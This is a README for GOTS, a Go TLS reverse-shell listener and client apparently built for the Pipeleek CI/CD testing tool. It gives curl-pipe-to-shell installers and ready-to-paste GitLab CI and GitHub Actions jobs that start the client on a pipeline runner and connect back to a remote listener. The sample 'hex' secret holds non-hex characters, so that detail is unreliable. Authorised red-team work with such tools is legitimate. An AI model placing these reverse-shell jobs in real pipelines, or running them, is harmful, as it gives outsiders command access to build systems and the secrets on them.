<div align="center">
  <img src="pipeleek_gots.svg" alt="pipeleek_gots" width="200" />
</div>

# GOTS - Golang TCP/TLS (Reverse) Shell - For Pipeleek

> **⚠️ Disclaimer**: This project was entirely generated using AI (GitHub Copilot). Use at your own risk in production environments.

Minimal, encrypted reverse shell over raw TCP with TLS.

Use this when you need a self-hosted, encrypted reverse shell alternative—for example, when tools like [sshx](https://sshx.io/) cannot be used due to customer concerns about data residency or third-party hosting requirements.

## Install
- Binstaller (recommended):
  - gotsl (Listener): `curl -fsSL https://frjcomp.github.io/gots/install-gotsl.sh | sh`
  - gotsr (Client): `curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh`
  - Set `BINSTALLER_BIN` to change install dir (defaults to `~/.local/bin`).

- From source:
  ```bash
  git clone https://github.com/frjcomp/gots.git
  cd gots
  make build  # outputs to bin/
  ```

## Usage

### Basic Usage
- Start gotsl (Listener, TLS, self-signed):
  ```bash
  ./gotsl <port> <bind-ip>
  ```
- Start gotsr (Reverse shell client):
  ```bash
  ./gotsr <host:port> <max-retries>
  ```
- Core gotsl commands: `list`, `shell <client_id>`, `exit`.
- In a session: run shell commands; `Ctrl D` to return.

### Shared Secret Authentication
For additional security, use a shared secret handshake between listener and client:

1. Start gotsl with `-s` flag to auto-generate a secret:
   ```bash
   ./gotsl -s <port> <bind-ip>
   ```
   This prints the full gotsr command with the hex-encoded secret and certificate fingerprint:
   ```
   ✓ Shared secret authentication enabled
   Secret (hex): 47e5e491ed1308f0fe4f83520fddb8f45cf3c1094f4e1d387cdb0e99b6c3f426a1b2c3d4e5f6g7h8i
   
   To connect, use:
   ./gotsr -s 47e5e491ed1308f0fe4f83520fddb8f45cf3c1094f4e1d387cdb0e99b6c3f426a1b2c3d4e5f6g7h8i --cert-fingerprint 686033a3b9db41c3877e484f4df210ac98bff296da9d6f99ef36f1394c1946ee 127.0.0.1:8443 1
   ```

2. Start gotsr with the hex-encoded secret and fingerprint:
   ```bash
   ./gotsr -s <hex-secret> --cert-fingerprint <fingerprint> <host:port> <max-retries>
   ```

The listener will log a warning if the client fails to authenticate with the correct secret.

### Certificate Fingerprint Validation
When using shared secret authentication, the client automatically validates the server's certificate fingerprint to prevent man-in-the-middle attacks. The fingerprint is printed by gotsl on startup and can be verified on the client side via the `--cert-fingerprint` flag.

## Notes
- Protocol: TLS 1.2+ over TCP only (no HTTP).
- Defaults to self-signed cert generation on the gotsl (listener).
- Shared secret authentication uses cryptographically secure random hex-encoded 32-byte secrets.
- Certificate fingerprints are SHA256 hashes of the server certificate (DER encoded).

## Testing
- Run unit and integration tests locally:
  ```bash
  go test -race ./...
  ```
- Run only integration tests (end-to-end CLI tests):
  ```bash
  go test -race ./integration
  ```
  Integration tests invoke the compiled binaries to test full workflows, including PTY sessions, file transfers, and authentication scenarios.

## CI examples
- GitLab CI (`.gitlab-ci.yml`):
  ```yaml
  stages: [run]
  reverse:
    stage: run
    image: alpine:3.19
    script:
      - apk add --no-cache curl
      - curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
      - ~/.local/bin/gotsr listener.example.com:8443 3
  ```

- GitHub Actions:
  ```yaml
  name: reverse
  on: [workflow_dispatch]
  jobs:
    run-reverse:
      runs-on: ubuntu-latest
      steps:
        - name: Install gotsr client
          run: curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
        - name: Run gotsr
          run: ~/.local/bin/gotsr listener.example.com:8443 3
  ```

- GitHub Actions (Windows, PowerShell):
  ```yaml
  name: reverse-windows
  on: [workflow_dispatch]
  jobs:
    run-reverse:
      runs-on: windows-latest
      steps:
        - name: Install gotsr client (PowerShell)
          shell: pwsh
          run: |
            & "C:/Program Files/Git/bin/bash.exe" -lc "curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh"
        - name: Run gotsr (PowerShell)
          shell: pwsh
          run: |
            & "$HOME/.local/bin/gotsr" listener.example.com:8443 3
  ```
